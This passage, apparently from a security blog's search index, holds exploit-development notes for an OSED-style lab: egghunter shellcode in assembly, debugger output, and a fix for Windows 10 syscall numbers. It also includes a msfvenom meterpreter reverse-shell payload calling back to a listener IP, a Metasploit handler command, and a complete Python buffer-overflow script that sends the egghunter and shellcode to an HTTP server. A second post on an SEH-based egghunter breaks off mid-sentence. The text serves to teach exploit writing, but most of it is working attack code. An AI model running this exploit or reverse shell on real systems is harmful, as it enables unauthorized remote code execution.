we have appropiate access, the system call will return status_no_impersonation_token. if we access an unmapped memory page or one without appropiate access we will obtain a status_access_violation code. this is why this system call is interesting for the egghunter as we can use it to enumerate the memory pages in which we have access to and are mapped. now that we have a basic understanding of what mechanisms the egghunter technique abuses, let’s examine the code below and find out how to implement it:\nfrom keystone import * code = ( # we use the edx register as a memory page counter \u0026#34; \u0026#34; \u0026#34; loop_inc_page: \u0026#34; # go to the last address in the memory page \u0026#34; or dx, 0x0fff ;\u0026#34; \u0026#34; loop_inc_one: \u0026#34; # increase the memory counter by one \u0026#34; inc edx ;\u0026#34; \u0026#34; loop_check: \u0026#34; # save the edx register which holds our memory # address on the stack \u0026#34; push edx ;\u0026#34; # push the system call number \u0026#34; push 0x2 ;\u0026#34; # initialize the call to ntaccesscheckandauditalarm \u0026#34; pop eax ;\u0026#34; # perform the system call \u0026#34; int 0x2e ;\u0026#34; # check for access violation, 0xc0000005 # (access_violation) \u0026#34; cmp al,05 ;\u0026#34; # restore the edx register to check later # for our egg \u0026#34; pop edx ;\u0026#34; \u0026#34; loop_check_valid: \u0026#34; # if access violation encountered, go to next page \u0026#34; je loop_inc_page ;\u0026#34; \u0026#34; is_egg: \u0026#34; # load egg (w00t in this example) into # the eax register \u0026#34; mov eax, 0x74303077 ;\u0026#34; # initializes pointer with current checked # address \u0026#34; mov edi, edx ;\u0026#34; # compare eax with doubleword at edi and # set status flags \u0026#34; scasd ;\u0026#34; # no match, we will increase our memory # counter by one \u0026#34; jnz loop_inc_one ;\u0026#34; # first part of the egg detected, check for # the second part \u0026#34; scasd ;\u0026#34; # no match, we found just a location # with half an egg \u0026#34; jnz loop_inc_one ;\u0026#34; \u0026#34; matched: \u0026#34; # the edi register points to the first # byte of our buffer, we can jump to it \u0026#34; jmp edi ;\u0026#34; ) # initialize engine in 32bit mode ks = ks(ks_arch_x86, ks_mode_32) encoding, count = ks.asm(code) egghunter = \u0026#34;\u0026#34; for dec in encoding: egghunter += \u0026#34;\\\\x{0:02x}\u0026#34;.format(int(dec)).rstrip(\u0026#34;\\n\u0026#34;) print(\u0026#34;egghunter = (\\\u0026#34;\u0026#34; + egghunter + \u0026#34;\\\u0026#34;)\u0026#34;) let\u0026rsquo;s analyze what does this egghunter code do part by part.\n\u0026#34; loop_inc_page: \u0026#34; # go to the last address in the memory page \u0026#34; or dx, 0x0fff ;\u0026#34; \u0026#34; loop_inc_one: \u0026#34; # increase the memory counter by one \u0026#34; inc edx ;\u0026#34; the egghunter starts with loop_inc_page, performing an or operation on the dx register with 0x0fff. this will make edx point to the last possible address of a memory page. note that we could set edx to 0xfffff000, but the operations will have badchars (e.g., 00) and our shellcode must not have badchars, always remember that. the loop_inc_one operation sets edx to a new memory page by incrementing it 1 more. we can see that edx points to the memory pages.\n\u0026#34; loop_check: \u0026#34; # save the edx register which holds our memory # address on the stack \u0026#34; push edx ;\u0026#34; # push the system call number \u0026#34; push 0x2 ;\u0026#34; # initialize the call to ntaccesscheckandauditalarm \u0026#34; pop eax ;\u0026#34; # perform the system call \u0026#34; int 0x2e ;\u0026#34; # check for access violation, 0xc0000005 # (access_violation) \u0026#34; cmp al,05 ;\u0026#34; # restore the edx register to check later # for our egg \u0026#34; pop edx ;\u0026#34; \u0026#34; loop_check_valid: \u0026#34; # if access violation encountered, go to next page \u0026#34; je loop_inc_page ;\u0026#34; this is the check that is being performed over such memory page. it is pushing the value of edx (memory region) in the stack, to store it for later (we don\u0026rsquo;t know if edx will be overwritten), then putting the number 0x2 in eax, which is the system call number for ntaccesscheckandauditalarm, performing the syscall via a interruption (0x2e) (microsoft designed the operating system to treat this exception as a system call) and comparing if the returned value from eax is 0xc000005. it only compares the lowest part of the register to 0x05, which is the same but the instruction is shorter. lastly, we restore the value of edx as it was in the stack to keep track of the next memory region to analyze and we jump to increment the page in the case that an exception has been found (the cmp operation modifies the status of the zf register). if the memory page is mapped and we have access, we won\u0026rsquo;t jump, but we will continue to the following code:\n\u0026#34; is_egg: \u0026#34; # load egg (w00t in this example) into # the eax register \u0026#34; mov eax, 0x74303077 ;\u0026#34; # initializes pointer with current checked # address \u0026#34; mov edi, edx ;\u0026#34; # compare eax with doubleword at edi and # set status flags \u0026#34; scasd ;\u0026#34; # no match, we will increase our memory # counter by one \u0026#34; jnz loop_inc_one ;\u0026#34; # first part of the egg detected, check for # the second part \u0026#34; scasd ;\u0026#34; # no match, we found just a location # with half an egg \u0026#34; jnz loop_inc_one ;\u0026#34; \u0026#34; matched: \u0026#34; # the edi register points to the first # byte of our buffer, we can jump to it \u0026#34; jmp edi ;\u0026#34; we load the \u0026ldquo;egg\u0026rdquo; we want to search into the eax register. we mov the pointer of the memory we are scanning to edi. we use the scasd operation to compare eax (the egg) with the dword at edi (this means the dword at the start of memory region). such operation will automatically increment edi by a dword, displacing it as we want. in case that there is no match, we increment the memory counter by one inside such memory region. in case that there is match, the match is only for the first dword, the first half of the egg, and we perform the scasd operation again to check for the other half egg. in case that both scasd operations are successful, we won\u0026rsquo;t increment the counters inside the memory region but we will reach to the matched tag, which is a jmp edi (edi at this point will store the location where the egg was found).\ninteresting note about this egghunter: the original code from matt miller used the ntdisplaystring1 system call, exploiting the very same concept. however, miller realized that the use of the ntaccesscheckandauditalarm system call was actually improving the portability of the egghunter. this is due to the fact that the ntaccesscheckandauditalarm system call number (0x02) didn’t change across different operating systems versions, compared to the one for ntdisplaystring, which changed between windows versions.\nonce we understood our egghunter, let\u0026rsquo;s use keystone to obtain the opcodes:\negghunter = (\u0026#34;\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\u0026#34;) we must replace these values for the \u0026ldquo;a\u0026rdquo; buffer after the http method (remember that we modified the http method to a routine to do a short jump to our \u0026ldquo;a\u0026rdquo; buffer. now, we want to jump to the egghunter and find our other buffer).\nlet\u0026rsquo;s put a breakpoint on the pop, ret and analyze if everything works until the egghunter (and confirm if the egghunter code is not mangled):\n0472ea8d 90 nop 0472ea8e 90 nop 0472ea8f 90 nop 0472ea90 90 nop 0472ea91 90 nop 0472ea92 90 nop 0472ea93 90 nop 0472ea94 90 nop 0472ea95 6681caff0f or dx,0fffh 0472ea9a 42 inc edx 0472ea9b 52 push edx 0472ea9c 6a02 push 2 0472ea9e 58 pop eax 0472ea9f cd2e int 2eh 0472eaa1 3c05 cmp al,5 0472eaa3 5a pop edx 0472eaa4 74ef je 0472ea95 0472eaa6 b877303074 mov eax,74303077h 0472eaab 89d7 mov edi,edx 0472eaad af scas dword ptr es:[edi] 0472eaae 75ea jne 0472ea9a 0472eab0 af scas dword ptr es:[edi] 0472eab1 75e7 jne 0472ea9a 0472eab3 ffe7 jmp edi our egghunter code is present in memory and appears to be intact. it should find our \u0026ldquo;w00tw00t\u0026rdquo; egg, which is here:\n0:008\u0026gt; s -a 0x0 l?80000000 w00tw00t 04b38186 77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44 w00tw00tdddddddd however, if we put a breakpoint in the address of the egg, and we continue the program, it keeps infinitely running and the breakpoint is not hit, meaning that it has not been able to find our egg buffer. we know the buffer is stored in memory so the problem is in our egghunter code.\nwhile we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on windows 7 or prior. this means that some changes occurred in between windows 7 and windows 10 that break the functionality of our egghunter. this means that it is possible that the egghunter that we used does not work in windows 10 for some reason.\nindeed, it does not work because of the ssn we have used. we have used the ssn 0x02 but this ssn is different in our windows for the syscall we want to perform. let\u0026rsquo;s check the official function in ntdll to see which ssn it is using:\nntdll!ntaccesscheckandauditalarm: 77cd24d0 b8c9010000 mov eax,1c9h 77cd24d5 e803000000 call ntdll!ntaccesscheckandauditalarm+0xd (77cd24dd) 77cd24da c22c00 ret 2ch 77cd24dd 8bd4 mov edx,esp 77cd24df 0f34 sysenter 77cd24e1 c3 ret 77cd24e2 8da42400000000 lea esp,[esp] 77cd24e9 8da42400000000 lea esp,[esp] based on this output, the ssn is 0x1c9. let\u0026rsquo;s change the script to replace our push 0x02 instruction to push 0x1c9. let\u0026rsquo;s see the resulting egghunter:\negghunter = (\u0026#34;\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x68\\xc9\\x01\\x00\\x00\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xec\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\\xaf\\x75\\xe7\\xaf\\x75\\xe4\\xff\\xe7\u0026#34;) so bad! our new egghunter has null bytes! these null bytes are bad characters and will prevent us from crashing the application. we have to modify the code of the egghunter a bit so that it does the same, but these bytes do not appear. we are going to use the neg assembly instruction. we need to generate a negative value that, when substracted from 0x00, will result in 0x1c9. let\u0026rsquo;s examine how we can do this:\n0:009\u0026gt; ? 0x0 - 0x1c9 evaluate expression: -457 = fffffe37 0:009\u0026gt; ? 0x0 - 0xfffffe37 evaluate expression: -4294966839 = ffffffff`000001c9 we begin by substracting the value we want to obtain from 0x0. this will give us our number but in negative value. if we negate the obtained value, we obtain a qword (64 bytes) but because we are running on a 32 bit architecture, the result we want will be stored in the lower dword of the total value (000001c9).\ntherefore, we can replace this instruction:\n\u0026#34; push 0x1c9 ;\u0026#34; for these ones:\n# push the system call number negated \u0026#34; mov eax, 0xfffffe37;\u0026#34; # negate it again \u0026#34; neg eax;\u0026#34; # initialize the call to ntaccesscheckandauditalarm # \u0026#34; pop eax ;\u0026#34; we don\u0026rsquo;t want to pop eax anymore, as we already have the value in eax. let\u0026rsquo;s check if the egghunter is mangled:\n0:008\u0026gt; u 0472ea8f l26 0472ea8f 90 nop 0472ea90 90 nop 0472ea91 90 nop 0472ea92 90 nop 0472ea93 90 nop 0472ea94 90 nop 0472ea95 6681caff0f or dx,0fffh 0472ea9a 42 inc edx 0472ea9b 52 push edx 0472ea9c b837feffff mov eax,0fffffe37h 0472eaa1 f7d8 neg eax 0472eaa3 cd2e int 2eh 0472eaa5 3c05 cmp al,5 0472eaa7 5a pop edx 0472eaa8 74eb je 0472ea95 0472eaaa b877303074 mov eax,offset windows_storage!cimagemanager::onloadoverlaycompleted+0x17 (74303077) 0472eaaf 89d7 mov edi,edx 0472eab1 af scas dword ptr es:[edi] 0472eab2 75e6 jne 0472ea9a 0472eab4 af scas dword ptr es:[edi] 0472eab5 75e3 jne 0472ea9a 0472eab7 ffe7 jmp edi fantastic, all of our egghunter does not contain badchars and is not mangled. now, let\u0026rsquo;s put a breakpoint on the jmp edi instruction and see what does edi have:\n0:008\u0026gt; g breakpoint 1 hit eax=74303077 ebx=001a2bf0 ecx=0472ea20 edx=04b38186 esi=001a2bf0 edi=04b3818e eip=0472eab7 esp=0472ea24 ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 0472eab7 ffe7 jmp edi {04b3818e} 0:008\u0026gt; dds edi 04b3818e 44444444 04b38192 44444444 04b38196 44444444 04b3819a 44444444 04b3819e 44444444 04b381a2 44444444 04b381a6 44444444 04b381aa 44444444 04b381ae 44444444 04b381b2 44444444 04b381b6 44444444 04b381ba 44444444 04b381be 44444444 04b381c2 44444444 04b381c6 44444444 04b381ca 44444444 04b381ce 44444444 04b381d2 44444444 04b381d6 44444444 04b381da 44444444 04b381de 44444444 04b381e2 44444444 04b381e6 44444444 04b381ea 44444444 04b381ee 44444444 04b381f2 44444444 04b381f6 44444444 04b381fa 44444444 04b381fe 44444444 04b38202 44444444 04b38206 44444444 fantastic, just after our egg:\n0:008\u0026gt; s -a 0x0 l?80000000 w00tw00t 04b38186 77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44 w00tw00tdddddddd lastly, we have checked if badchars are present in all of the code we have inserted but not on the payload that is going to execute. let\u0026rsquo;s insert a badchar array and check if any of the badchars is present:\n0:008\u0026gt; s -a 0x0 l?80000000 w00tw00t 04c38186 77 30 30 74 77 30 30 74-01 02 03 04 05 06 07 08 w00tw00t........ 0:008\u0026gt; db 04c38186 l110 04c38186 77 30 30 74 77 30 30 74-01 02 03 04 05 06 07 08 w00tw00t........ 04c38196 09 0b 0c 0e 0f 10 11 12-13 14 15 16 17 18 19 1a ................ 04c381a6 1b 1c 1d 1e 1f 20 21 22-23 24 26 27 28 29 2a 2b ..... !\u0026#34;#$\u0026amp;\u0026#39;()*+ 04c381b6 2c 2d 2e 2f 30 31 32 33-34 35 36 37 38 39 3a 3b ,-./0123456789:; 04c381c6 3c 3d 3e 3f 40 41 42 43-44 45 46 47 48 49 4a 4b \u0026lt;=\u0026gt;?@abcdefghijk 04c381d6 4c 4d 4e 4f 50 51 52 53-54 55 56 57 58 59 5a 5b lmnopqrstuvwxyz[ 04c381e6 5c 5d 5e 5f 60 61 62 63-64 65 66 67 68 69 6a 6b \\]^_`abcdefghijk 04c381f6 6c 6d 6e 6f 70 71 72 73-74 75 76 77 78 79 7a 7b lmnopqrstuvwxyz{ 04c38206 7c 7d 7e 7f 80 81 82 83-84 85 86 87 88 89 8a 8b |}~............. 04c38216 8c 8d 8e 8f 90 91 92 93-94 95 96 97 98 99 9a 9b ................ 04c38226 9c 9d 9e 9f a0 a1 a2 a3-a4 a5 a6 a7 a8 a9 aa ab ................ 04c38236 ac ad ae af b0 b1 b2 b3-b4 b5 b6 b7 b8 b9 ba bb ................ 04c38246 bc bd be bf c0 c1 c2 c3-c4 c5 c6 c7 c8 c9 ca cb ................ 04c38256 cc cd ce cf d0 d1 d2 d3-d4 d5 d6 d7 d8 d9 da db ................ 04c38266 dc dd de df e0 e1 e2 e3-e4 e5 e6 e7 e8 e9 ea eb ................ 04c38276 ec ed ee ef f0 f1 f2 f3-f4 f5 f6 f7 f8 f9 fa fb ................ 04c38286 fc fd fe ff 0a does not appear so we will count it as a badchar. let\u0026rsquo;s generate the payload and start listening once we send the full payload:\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.122.211 lport=443 -f python -v payload -b \u0026#34;\\x00\\x0a\u0026#34; [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload found 11 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of python file: 2064 bytes payload = b\u0026#34;\u0026#34; payload += b\u0026#34;\\xd9\\xc5\\xd9\\x74\\x24\\xf4\\xbd\\x09\\xf4\\x52\\x1d\u0026#34; payload += b\u0026#34;\\x58\\x31\\xc9\\xb1\\x59\\x83\\xe8\\xfc\\x31\\x68\\x15\u0026#34; payload += b\u0026#34;\\x03\\x68\\x15\\xeb\\x01\\xae\\xf5\\x64\\xe9\\x4f\\x06\u0026#34; payload += b\u0026#34;\\x1a\\x63\\xaa\\x37\\x08\\x17\\xbe\\x6a\\x9c\\x53\\x92\u0026#34; payload += b\u0026#34;\\x86\\x57\\x31\\x07\\x1c\\x15\\x9e\\x28\\x95\\x93\\xf8\u0026#34; payload += b\u0026#34;\\x07\\x26\\x12\\xc5\\xc4\\xe4\\x35\\xb9\\x16\\x39\\x95\u0026#34; payload += b\u0026#34;\\x80\\xd8\\x4c\\xd4\\xc5\\xae\\x3b\\x39\\x9b\\x67\\x4f\u0026#34; payload += b\u0026#34;\\x97\\x0c\\x03\\x0d\\x2b\\x2c\\xc3\\x19\\x13\\x56\\x66\u0026#34; payload += b\u0026#34;\\xdd\\xe7\\xea\\x69\\x0e\\x8c\\xbb\\x71\\x25\\xca\\x1b\u0026#34; payload += b\u0026#34;\\xd2\\x38\\x39\\xde\\x1b\\x4e\\x81\\xa8\\x10\\x9b\\x72\u0026#34; payload += b\u0026#34;\\x1b\\xd8\\xe5\\x52\\x6d\\xe6\\x27\\x95\\x83\\x4a\\xa6\u0026#34; payload += b\u0026#34;\\xee\\xa4\\x72\\xdc\\x04\\xd7\\x0f\\xe7\\xdf\\xa5\\xcb\u0026#34; payload += b\u0026#34;\\x62\\xff\\x0e\\x9f\\xd5\\xdb\\xaf\\x4c\\x83\\xa8\\xbc\u0026#34; payload += b\u0026#34;\\x39\\xc7\\xf6\\xa0\\xbc\\x04\\x8d\\xdd\\x35\\xab\\x41\u0026#34; payload += b\u0026#34;\\x54\\x0d\\x88\\x45\\x3c\\xd5\\xb1\\xdc\\x98\\xb8\\xce\u0026#34; payload += b\u0026#34;\\x3e\\x44\\x64\\x6b\\x35\\x67\\x73\\x0b\\xb6\\x77\\x7c\u0026#34; payload += b\u0026#34;\\x51\\x20\\xbb\\xb1\\x6a\\xb0\\xd3\\xc2\\x19\\x82\\x7c\u0026#34; payload += b\u0026#34;\\x79\\xb6\\xae\\xf5\\xa7\\x41\\xa7\\x12\\x58\\x9d\\x0f\u0026#34; payload += b\u0026#34;\\x72\\xa6\\x1e\\x6f\\x5a\\x6d\\x4a\\x3f\\xf4\\x44\\xf3\u0026#34; payload += b\u0026#34;\\xd4\\x04\\x68\\x26\\x40\\x0f\\xfe\\x09\\x3c\\x75\\x2d\u0026#34; payload += b\u0026#34;\\xe1\\x3e\\x8a\\xd0\\x49\\xb7\\x6c\\x82\\xfd\\x97\\x20\u0026#34; payload += b\u0026#34;\\x63\\xae\\x57\\x91\\x0b\\xa4\\x58\\xce\\x2c\\xc7\\xb3\u0026#34; payload += b\u0026#34;\\x67\\xc6\\x28\\x6d\\xdf\\x7f\\xd0\\x34\\xab\\x1e\\x1d\u0026#34; payload += b\u0026#34;\\xe3\\xd1\\x21\\x95\\x01\\x25\\xef\\x5e\\x60\\x35\\x18\u0026#34; payload += b\u0026#34;\\x39\\x8a\\xc5\\xd9\\xac\\x8a\\xaf\\xdd\\x66\\xdd\\x47\u0026#34; payload += b\u0026#34;\\xdc\\x5f\\x29\\xc8\\x1f\\x8a\\x2a\\x0f\\xdf\\x4b\\x1a\u0026#34; payload += b\u0026#34;\\x7b\\xd6\\xd9\\x22\\x13\\x17\\x0e\\xa2\\xe3\\x41\\x44\u0026#34; payload += b\u0026#34;\\xa2\\x8b\\x35\\x3c\\xf1\\xae\\x39\\xe9\\x66\\x63\\xac\u0026#34; payload += b\u0026#34;\\x12\\xde\\xd7\\x67\\x7b\\xdc\\x0e\\x4f\\x24\\x1f\\x65\u0026#34; payload += b\u0026#34;\\xd3\\x23\\xdf\\xfb\\xfc\\x8b\\xb7\\x03\\xbd\\x2b\\x47\u0026#34; payload += b\u0026#34;\\x6e\\x3d\\x7c\\x2f\\x65\\x12\\x73\\x9f\\x86\\xb9\\xdc\u0026#34; payload += b\u0026#34;\\xb7\\x0d\\x2c\\xae\\x26\\x11\\x65\\x6e\\xf6\\x12\\x8a\u0026#34; payload += b\u0026#34;\\xab\\x09\\x68\\xe3\\x4c\\xea\\x8d\\xed\\x28\\xeb\\x8d\u0026#34; payload += b\u0026#34;\\x11\\x4f\\xd0\\x5b\\x28\\x25\\x17\\x58\\x0f\\x36\\x22\u0026#34; payload += b\u0026#34;\\xfd\\x26\\xdd\\x4c\\x51\\x38\\xf4\u0026#34; sudo msfconsole -q -x \u0026#34;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.122.211; set lport 443; exploit\u0026#34; and a shell was gotten. the complete payload that implements our egghunter is the following:\n#!/usr/bin/python import socket import sys from struct import pack try: server = \u0026#34;192.168.122.113\u0026#34; port = 80 size = 253 # bp 0x418674 # 00 0a 0d 25 -\u0026gt; badchars httpmethod = b\u0026#34;\\x31\\xc9\\x85\\xc9\\x0f\\x84\\x11\u0026#34; + b\u0026#34; /\u0026#34; # xor ecx, ecx; test ecx, ecx; je 0x17 payload = b\u0026#34;\u0026#34; payload += b\u0026#34;\\xd9\\xc5\\xd9\\x74\\x24\\xf4\\xbd\\x09\\xf4\\x52\\x1d\u0026#34; payload += b\u0026#34;\\x58\\x31\\xc9\\xb1\\x59\\x83\\xe8\\xfc\\x31\\x68\\x15\u0026#34; payload += b\u0026#34;\\x03\\x68\\x15\\xeb\\x01\\xae\\xf5\\x64\\xe9\\x4f\\x06\u0026#34; payload += b\u0026#34;\\x1a\\x63\\xaa\\x37\\x08\\x17\\xbe\\x6a\\x9c\\x53\\x92\u0026#34; payload += b\u0026#34;\\x86\\x57\\x31\\x07\\x1c\\x15\\x9e\\x28\\x95\\x93\\xf8\u0026#34; payload += b\u0026#34;\\x07\\x26\\x12\\xc5\\xc4\\xe4\\x35\\xb9\\x16\\x39\\x95\u0026#34; payload += b\u0026#34;\\x80\\xd8\\x4c\\xd4\\xc5\\xae\\x3b\\x39\\x9b\\x67\\x4f\u0026#34; payload += b\u0026#34;\\x97\\x0c\\x03\\x0d\\x2b\\x2c\\xc3\\x19\\x13\\x56\\x66\u0026#34; payload += b\u0026#34;\\xdd\\xe7\\xea\\x69\\x0e\\x8c\\xbb\\x71\\x25\\xca\\x1b\u0026#34; payload += b\u0026#34;\\xd2\\x38\\x39\\xde\\x1b\\x4e\\x81\\xa8\\x10\\x9b\\x72\u0026#34; payload += b\u0026#34;\\x1b\\xd8\\xe5\\x52\\x6d\\xe6\\x27\\x95\\x83\\x4a\\xa6\u0026#34; payload += b\u0026#34;\\xee\\xa4\\x72\\xdc\\x04\\xd7\\x0f\\xe7\\xdf\\xa5\\xcb\u0026#34; payload += b\u0026#34;\\x62\\xff\\x0e\\x9f\\xd5\\xdb\\xaf\\x4c\\x83\\xa8\\xbc\u0026#34; payload += b\u0026#34;\\x39\\xc7\\xf6\\xa0\\xbc\\x04\\x8d\\xdd\\x35\\xab\\x41\u0026#34; payload += b\u0026#34;\\x54\\x0d\\x88\\x45\\x3c\\xd5\\xb1\\xdc\\x98\\xb8\\xce\u0026#34; payload += b\u0026#34;\\x3e\\x44\\x64\\x6b\\x35\\x67\\x73\\x0b\\xb6\\x77\\x7c\u0026#34; payload += b\u0026#34;\\x51\\x20\\xbb\\xb1\\x6a\\xb0\\xd3\\xc2\\x19\\x82\\x7c\u0026#34; payload += b\u0026#34;\\x79\\xb6\\xae\\xf5\\xa7\\x41\\xa7\\x12\\x58\\x9d\\x0f\u0026#34; payload += b\u0026#34;\\x72\\xa6\\x1e\\x6f\\x5a\\x6d\\x4a\\x3f\\xf4\\x44\\xf3\u0026#34; payload += b\u0026#34;\\xd4\\x04\\x68\\x26\\x40\\x0f\\xfe\\x09\\x3c\\x75\\x2d\u0026#34; payload += b\u0026#34;\\xe1\\x3e\\x8a\\xd0\\x49\\xb7\\x6c\\x82\\xfd\\x97\\x20\u0026#34; payload += b\u0026#34;\\x63\\xae\\x57\\x91\\x0b\\xa4\\x58\\xce\\x2c\\xc7\\xb3\u0026#34; payload += b\u0026#34;\\x67\\xc6\\x28\\x6d\\xdf\\x7f\\xd0\\x34\\xab\\x1e\\x1d\u0026#34; payload += b\u0026#34;\\xe3\\xd1\\x21\\x95\\x01\\x25\\xef\\x5e\\x60\\x35\\x18\u0026#34; payload += b\u0026#34;\\x39\\x8a\\xc5\\xd9\\xac\\x8a\\xaf\\xdd\\x66\\xdd\\x47\u0026#34; payload += b\u0026#34;\\xdc\\x5f\\x29\\xc8\\x1f\\x8a\\x2a\\x0f\\xdf\\x4b\\x1a\u0026#34; payload += b\u0026#34;\\x7b\\xd6\\xd9\\x22\\x13\\x17\\x0e\\xa2\\xe3\\x41\\x44\u0026#34; payload += b\u0026#34;\\xa2\\x8b\\x35\\x3c\\xf1\\xae\\x39\\xe9\\x66\\x63\\xac\u0026#34; payload += b\u0026#34;\\x12\\xde\\xd7\\x67\\x7b\\xdc\\x0e\\x4f\\x24\\x1f\\x65\u0026#34; payload += b\u0026#34;\\xd3\\x23\\xdf\\xfb\\xfc\\x8b\\xb7\\x03\\xbd\\x2b\\x47\u0026#34; payload += b\u0026#34;\\x6e\\x3d\\x7c\\x2f\\x65\\x12\\x73\\x9f\\x86\\xb9\\xdc\u0026#34; payload += b\u0026#34;\\xb7\\x0d\\x2c\\xae\\x26\\x11\\x65\\x6e\\xf6\\x12\\x8a\u0026#34; payload += b\u0026#34;\\xab\\x09\\x68\\xe3\\x4c\\xea\\x8d\\xed\\x28\\xeb\\x8d\u0026#34; payload += b\u0026#34;\\x11\\x4f\\xd0\\x5b\\x28\\x25\\x17\\x58\\x0f\\x36\\x22\u0026#34; payload += b\u0026#34;\\xfd\\x26\\xdd\\x4c\\x51\\x38\\xf4\u0026#34; egghunter = b\u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\xb8\\x37\\xfe\\xff\\xff\\xf7\\xd8\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xeb\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\\xaf\\x75\\xe6\\xaf\\x75\\xe3\\xff\\xe7\u0026#34; inputbuffer = b\u0026#34;\\x41\u0026#34; * (size - len(egghunter)) inputbuffer+= pack(\u0026#34;\u0026lt;l\u0026#34;, 0x418674) # 0x00418674 - pop eax; ret shellcode = b\u0026#34;w00tw00t\u0026#34; + payload + b\u0026#34;d\u0026#34; * (400-len(payload)) httpendrequest = b\u0026#34;\\r\\n\\r\\n\u0026#34; buf = httpmethod + egghunter + inputbuffer + httpendrequest + shellcode print(\u0026#34;sending evil buffer...\u0026#34;) s = socket.socket(socket.af_inet, socket.sock_stream) s.connect((server, port)) s.send(buf) s.close() print(\u0026#34;done!\u0026#34;) except socket.error: print(\u0026#34;could not connect!\u0026#34;) ","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_egghunter_seh/","summary":"\u003cp\u003eWhen doing the classical egghunter shellcode, we observed that the NtAccessCheckAndAuditAlarm function did not work because the system call number was changed between Windows versions.\nWe fixed this by changing the system call number, but this fix comes at the cost of portability. In order for our exploit to work, we would have to identify the Windows version beforehand to craft a proper exploit.\u003c/p\u003e","tags":[],"text":"when doing the classical egghunter shellcode, we observed that the ntaccesscheckandauditalarm function did not work because the system call number was changed between windows versions. we fixed this by changing the system call number, but this fix comes at the cost of portability. in order for our exploit to work, we would have to identify the windows version beforehand to craft a proper exploit.\nin this case, we are going to make an egghunter that does not use the ntaccesscheckandauditalarm function (remember that we used this function in order to check in a safe way if we have right access to the memory, as this function handles errors) and we are going to handle the error manually when checking if the memory region is accessible. this way, we won\u0026rsquo;t depend on this system call and we won\u0026rsquo;t need to have specific ssns depending on the windows versions.\nthe downside to this mechanism is that the egghunter requires additional assembly instructions in order to set up the seh mechanism- the original egghunter was around 35 bytes whereas this egghunter is 60 bytes. however, it is still smaller than a normal shellcode and it can help if we have space.\nlet\u0026rsquo;s analyze the code of this seh-based egghunter:\nfrom keystone import * code = ( \u0026#34; start: \u0026#34; # jump to a negative call to dynamically # obtain egghunter position \u0026#34; jmp get_seh_address ;\u0026#34; \u0026#34; build_exception_record: \u0026#34; # pop the address of the exception_handler # into ecx \u0026#34; pop ecx ;\u0026#34; # mov signature into eax \u0026#34; mov eax, 0x74303077 ;\u0026#34; # push handler of the # _exception_registration_record structure \u0026#34; push ecx ;\u0026#34; # push next of the # _exception_registration_record structure \u0026#34; push 0xffffffff ;\u0026#34; # null out ebx \u0026#34; xor ebx, ebx ;\u0026#34; # overwrite exceptionlist in the teb with a pointer # to our new _exception_registration_record structure \u0026#34; mov dword ptr fs:[ebx], esp ;\u0026#34; \u0026#34; is_egg: \u0026#34; # push 0x02 \u0026#34; push 0x02 ;\u0026#34; # pop the value into ecx which will act # as a counter \u0026#34; pop ecx ;\u0026#34; # mov memory address into edi \u0026#34; mov edi, ebx ;\u0026#34; # check for our signature, if the page is invalid we # trigger an exception and jump to our exception_handler function \u0026#34; repe scasd ;\u0026#34; # if we didn\u0026#39;t find signature, increase ebx # and repeat \u0026#34; jnz loop_inc_one ;\u0026#34; # we found our signature and will jump to it \u0026#34; jmp edi ;\u0026#34; \u0026#34; loop_inc_page: \u0026#34; # if page is invalid the exception_handler will # update eip to point here and we move to next page \u0026#34; or bx, 0xfff ;\u0026#34; \u0026#34; loop_inc_one: \u0026#34; # increase ebx by one byte \u0026#34; inc ebx ;\u0026#34; # check for signature again \u0026#34; jmp is_egg ;\u0026#34; \u0026#34; get_seh_address: \u0026#34; # call to a higher address to avoid null bytes \u0026amp; push # return to obtain egghunter position \u0026#34; call build_exception_record ;\u0026#34; # push 0x0c onto the stack \u0026#34; push 0x0c ;\u0026#34; # pop the value into ecx \u0026#34; pop ecx ;\u0026#34; # mov into eax the pointer to the context # structure for our exception \u0026#34; mov eax, [esp+ecx] ;\u0026#34; # mov 0xb8 into ecx which will act as an # offset to the eip \u0026#34; mov cl, 0xb8 ;\u0026#34; # increase the value of eip by 0x06 in our context # so it points to the \u0026#34;or bx, 0xfff\u0026#34; instruction # to increase the memory page \u0026#34; add dword ptr ds:[eax+ecx], 0x06 ;\u0026#34; # save return value into eax (if you analyze this deeply you will find that the address of push 0x0c is on top of the stack, so doing a pop will store it) \u0026#34; pop eax ;\u0026#34; # increase esp to clean the stack for our call \u0026#34; add esp, 0x10 ;\u0026#34; # push return value back into the stack \u0026#34; push eax ;\u0026#34; # null out eax to simulate # exceptioncontinueexecution return \u0026#34; xor eax, eax ;\u0026#34; # return \u0026#34; ret ;\u0026#34; ) # initialize engine in x86-32bit mode ks = ks(ks_arch_x86, ks_mode_32) the code starts by executing a jmp instruction to a later part in the code, the get_seh_address label. in this label, the first instruction is a relative call to the build_exception_record function. when executing a relative call, the opcodes will match the offset from the current value of eip. this would generate opcodes, but, as we are calling a function that is declared previosly in the code, the offset is negative, and we are doing a backward call, so there are not nullbytes as the offset is negative. that is why we declare our build_exception_record after in the code (note: we learnt that the disposition of the labels is very important when doing shellcode!). also, 